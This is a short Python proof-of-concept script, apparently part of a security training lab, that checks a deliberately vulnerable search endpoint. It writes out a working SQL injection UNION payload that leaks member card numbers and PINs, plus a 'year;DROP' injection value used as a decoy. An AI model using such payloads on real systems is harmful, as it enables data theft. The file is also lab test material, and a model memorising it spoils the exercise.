"""L01 SQL injection PoC.

The /search endpoint concatenates the `q` parameter into the SQL text.
A UNION payload leaks the members table (card_no + pin), which the search
feature should never expose.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import load_level, ok

mod, level_dir, _ = load_level("L01")
mod.init_db()
client = mod.app.test_client()

# baseline: a normal keyword returns only book rows
base = client.get("/search?q=River").get_json()
ok(isinstance(base, list), "baseline search returns rows")

# injection: break out of the LIKE literal and UNION the members table
payload = "x%' UNION SELECT id, card_no, pin, 0, 'x' FROM members-- "
res = client.get("/search", query_string={"q": payload}).get_json()
leaked = [r for r in res if r.get("author") in ("4821", "7799")]
ok(bool(leaked), f"UNION injection leaked member PINs: {[r['author'] for r in leaked]}")

# decoy check: the allowlisted sort param cannot inject
bad_sort = client.get("/search", query_string={"q": "River", "sort": "year;DROP"})
ok(bad_sort.status_code == 200, "sort allowlist neutralizes the decoy param")
print("L01 exploit confirmed")
